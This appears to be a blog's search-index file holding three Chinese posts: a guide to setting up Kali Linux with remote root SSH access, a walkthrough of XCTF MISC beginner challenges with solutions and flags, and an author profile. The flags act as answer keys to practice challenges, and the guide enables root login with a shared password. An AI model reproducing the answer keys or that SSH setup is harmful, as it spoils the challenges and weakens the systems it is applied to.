      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>漏洞利用</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建kali攻击机及windows远程连接（科普向）</title>
    <link href="/2020/03/10/dig1/"/>
    <url>/2020/03/10/dig1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>继续移植之前的存货</p></blockquote><blockquote><p>想开个漏洞攻击的坑，不知道能不能填上。（这句话tmd是我半年前写的,然后一共没更几期）</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>漏洞利用（英语：Exploit，本意为“利用”）是计算机安全术语，指的是利用程序中的某些漏洞，来得到计算机的控制权（使自己编写的代码越过具有漏洞的程序的限制，从而获得运行权限）。在英语中，本词也是名词，表示为了利用漏洞而编写的攻击程序，即漏洞利用程序（维基百科）</p><p>通俗的说，就是我们利用程序的漏洞控制程序的过程。（沃.兹及硕德）</p><h2 id="攻击机搭建"><a href="#攻击机搭建" class="headerlink" title="攻击机搭建"></a>攻击机搭建</h2><p>我们使用kali linux作为攻击机，kali是基于debian的linux发行版，载有很多渗透测试和攻击程序，是一个很牛逼的攻击平台。</p><p>系统安装的过程很简单，我们从北邮人下载kali linux，（当然官网下载也可以，直接百度kali就能找到链接）然后制作USB镜像，U盘引导启动即可。</p><p>当然，kali也可以安装在虚拟机上，但由于本人电脑内存不太够，所以就没这么玩。</p><p>科中的kali安装在我的U盘上，有需求的同学可以到.62体验，U盘引导启动进入kali，硬盘引导启动进入ubuntu16.04。</p><p>4  windows远程连接</p><p>kali装完了，下一个问题出现了，我们基地有几十名同学，总不能每一次想用kali都到我这去用，这样会很麻烦（这样我会很烦），因此我们要做一个windows远程连接。</p><p>说明：kali linux科中已经配置完成，不要在.62重新配置（无关人员自行跳过）</p><p>首先，我们打开kali的控制台（ctrl+alt+t）</p><p>我们先查看kali的ssh配置</p><blockquote><p>/etc/ssh/sshd_config</p></blockquote><p>然后，我们将以下变量按照下面的代码修改</p><pre><code>port 22PermitRootLogin yesPubkeyAuthentication yes</code></pre><p>保存退出(wq)</p><p>输入下面的命令打开kali ssh（每次开机都要重新打开）</p><blockquote><p>service ssh start</p></blockquote><p>输入ifconfig（注意，不是ipconfig）查看ip</p><p>记下ip和上面的port 22。</p><p>(以上过程科中已经配置完成，不需要重新配置）</p><p>回到自己的电脑，我们使用Xshell进行远程连接，下载Xshell就不贴地址了，google是你的好朋友。</p><p>新建会话属性——&gt;主机ip设置，端口设置——&gt;创建<br><a href="https://imgchr.com/i/8P0og1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8P0og1.jpg" srcset="/img/loading.gif" alt="8P0og1.jpg" border="0" /></a><br>打开——&gt;连接——&gt;你建的会话的名字<br><a href="https://imgchr.com/i/8P0z8A" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8P0z8A.jpg" srcset="/img/loading.gif" alt="8P0z8A.jpg" border="0" /></a></p><p>会提示你输入root密码，密码科中的同学们应该都知道，不知道的问我也行。(如果你是路人的话你自己搭的肯定知道密码。。。下面的回复好奇怪)</p><p>如果运行成功，会显示root@kali，这代表你进入了kali的终端。</p><p>尝试ifconfig<br><a href="https://imgchr.com/i/8PBe8s" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8PBe8s.jpg" srcset="/img/loading.gif" alt="8PBe8s.jpg" border="0" /></a></p><p>快乐由此开始</p>]]></content>
    
    
    <categories>
      
      <category>科普向作品集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>漏洞利用</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 MISC 新手村攻略</title>
    <link href="/2020/03/10/hello-world/"/>
    <url>/2020/03/10/hello-world/</url>
    
    <content type="html"><![CDATA[<blockquote><p>作为一名逆向手，MISC之前看别人做一直感觉好玩但没碰过(此前一直羡慕队里的MISC手），真正做起来感觉这玩意还是挺烧脑的，脑洞不够的我着实玩不起/xk/xk</p></blockquote><p>题目地址： <a href="https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0&amp;page=1</a></p><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h2><p>签到题，flag题干直接给了</p><h2 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h2><p>题干中提到图片下面什么都没有，所以我们把图片移走就好了，flag在下面</p><p>这题大佬们似乎都用的PDF编辑器，我这种业余玩家是把PDF转成word来弄的，实现此功能有个靠谱的网站：<br><a href="https://app.xunjiepdf.com/pdf2word/" target="_blank" rel="noopener">https://app.xunjiepdf.com/pdf2word/</a></p><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>动态图按贞分解发现了疑似二维码，但是这个二维码好像缺了点什么。。<br><img src="https://s2.ax1x.com/2020/03/10/8CjHe0.png" srcset="/img/loading.gif" alt="8CjHe0.png" border="0" /><br>拿个正常二维码对比一下，发现是少了三个角，修复之后如下：<br><a href="https://imgchr.com/i/8CvLnI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8CvLnI.th.png" srcset="/img/loading.gif" alt="8CvLnI.png" border="0" /></a><br>扫描得flag</p><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>与佛论禅编码，发现疑似base64，但是解不开，考虑到题干中有13，于是想到了rot13，rot13后再进行base64解码，推荐一个网站： <a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">http://ctf.ssleye.com/</a> ，可以实现大部分简单编码、密码加解密。</p><p>flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>黑白图片，进行白为0黑为1的转换得到：01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101<br>二进制转字符串，仍然可以使用上面的网页完成</p><p>flag{FuN_giF}</p><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>菜鸡终于看见一道属于自己的本职工作了（得以嘲讽队内MISC大佬们）<br>jar文件，jd-gui直接看源码就行<br><img src="https://s2.ax1x.com/2020/03/10/8CxhKs.png" srcset="/img/loading.gif" alt="8CxhKs.png" border="0" /></p><h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p>一串16进制数，按ascii码分析，感觉这些数都太大了，突然发现每个数-0x80之后都在可见字符范围内，python脚本给上：</p><pre><code class="python">string = &quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;flag = &#39;&#39;for i in range(0,len(string), 2):    s = &quot;0x&quot; + string[i] + string[i+1]    flag += chr(int(s, 16) - 0x80)print(flag)</code></pre><h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>linux映像文件，ubuntu导入映像，翻文件翻到flag（ls，cd，cat大法）</p><h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>用记事本打开看到一堆AB，疑似摩尔斯电码，转化发现flag</p><h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>涉及到base64隐写问题，看大佬分析吧<a href="https://blog.csdn.net/zz_Caleb/article/details/89298335" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/89298335</a></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>还有两道题没做，以后再补吧（又鸽了）。话说MISC确实很好玩，不过我也是菜，几道入门题玩了这么长时间。。。以后有时间还会继续玩的</p>]]></content>
    
    
    <categories>
      
      <category>CTF题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人简介</title>
    <link href="/2020/03/09/myself/"/>
    <url>/2020/03/09/myself/</url>
    
    <content type="html"><![CDATA[<blockquote><p>This is my new blog. I gave up my previous blog because it has not been updated. I hope I can stick to it this time.</p></blockquote><h2 id="profile"><a href="#profile" class="headerlink" title="profile"></a>profile</h2><p>name: Dingyn</p><p>internet name: Mag1c (unkn0wn)</p><p>major: cs</p><p>age: 20</p><p>description: A man enjoying programming and CTF, leader of team pr3</p><h2 id="Going-to-write-about"><a href="#Going-to-write-about" class="headerlink" title="Going to write about"></a>Going to write about</h2><p>Program development, algorithms, CTF, and some weird stuff.</p><h2 id="Recent-plan"><a href="#Recent-plan" class="headerlink" title="Recent plan"></a>Recent plan</h2><p>Be prepared to port the previous articles posted on various platforms, and update some data structures and information security contents from time to time.</p><h2 id="E-mail"><a href="#E-mail" class="headerlink" title="E-mail"></a>E-mail</h2><p><a href="mailto:dyn201885095@gmail.com">dyn201885095@gmail.com</a></p><h2 id="future"><a href="#future" class="headerlink" title="future"></a>future</h2><p>fun is everything</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
